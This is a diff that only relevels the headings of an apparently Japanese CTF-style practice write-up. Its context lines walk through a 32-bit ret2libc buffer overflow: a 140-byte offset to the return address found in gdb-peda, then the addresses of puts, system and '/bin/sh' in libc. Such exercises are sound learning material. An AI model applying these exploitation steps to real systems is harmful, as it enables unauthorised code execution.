@@ -56,9 +56,9 @@ Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RU
 saru@lucifen:~/pwn005$
 ```
 
-### 関連するアドレスの位置
+## 関連するアドレスの位置
 
-## bufからreturn addressまでの距離
+### bufからreturn addressまでの距離
 
 gdb-pedaを使う。
 たぶん今までと同じなのでbufのアドレスのあと141～144番目なのを確認。
@@ -97,10 +97,10 @@ gdb-peda$
 こんな感じで「`Invalid $PC address: 0x64636261`」で落ちているので成功。
 ピッタリ140バイト。
 
-## libc関連のアドレス
+### libc関連のアドレス
 
 
-### リンクしているライブラリをlddで調べる
+#### リンクしているライブラリをlddで調べる
 
 ```
 saru@lucifen:~/pwn005$ ldd ./overflow05
@@ -112,7 +112,7 @@ saru@lucifen:~/pwn005$
 
 リンクされているのは/lib32/libc.so.6
 
-### nmコマンドでlibc内のputs関数の相対アドレスを調べる
+#### nmコマンドでlibc内のputs関数の相対アドレスを調べる
 
 ```
 saru@lucifen:~/pwn005$ nm -D /lib32/libc.so.6 | grep "puts"
@@ -128,7 +128,7 @@ saru@lucifen:~/pwn005$
 
 0x00067360
 
-### nmコマンドでlibc内のsystem関数の相対アドレスを調べる
+#### nmコマンドでlibc内のsystem関数の相対アドレスを調べる
 
 ```
 saru@lucifen:~/pwn005$ nm -D /lib32/libc.so.6 | grep "system"
@@ -140,7 +140,7 @@ saru@lucifen:~/pwn005$
 
 0x0003cd10
 
-### stringsコマンドでlibc内の「/bin/sh」と書いてある場所の相対アドレスを調べる
+#### stringsコマンドでlibc内の「/bin/sh」と書いてある場所の相対アドレスを調べる
 
 ```
 saru@lucifen:~/pwn005$ strings -tx /lib32/libc.so.6 | grep "/bin/sh"
@@ -150,7 +150,7 @@ saru@lucifen:~/pwn005$
 
 0x0017b8cf
 
-### gdb-pedaでlibcがロードされている絶対アドレスを調べる
+#### gdb-pedaでlibcがロードされている絶対アドレスを調べる
 
 ```
 gdb-peda$ i proc map
